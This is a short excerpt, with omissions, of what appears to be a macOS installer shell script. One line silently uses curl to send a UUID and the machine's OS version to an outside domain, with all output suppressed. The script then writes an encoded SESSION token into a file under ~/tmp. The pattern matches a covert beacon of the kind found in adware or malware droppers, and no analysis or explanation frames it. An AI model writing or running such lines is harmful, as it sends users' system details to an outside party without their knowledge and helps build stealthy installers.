...
curl -s "https://brightly.buzz/post_info?uuid=fbfc78e2-c3ea-4d39-9e8a-403d9f24a478&os=$(/usr/bin/sw_vers -productVersion)" > /dev/null 2>&1
...
cd ~/tmp
echo SESSION=+YDtFxbvKCMJ0v+EK7uqmR93tT9FM9ujNFYOTFiQ9GUEzsRga5JdDrwmagIxoqjfJ/1ZEumutJczxfQHR68CtQ== > context
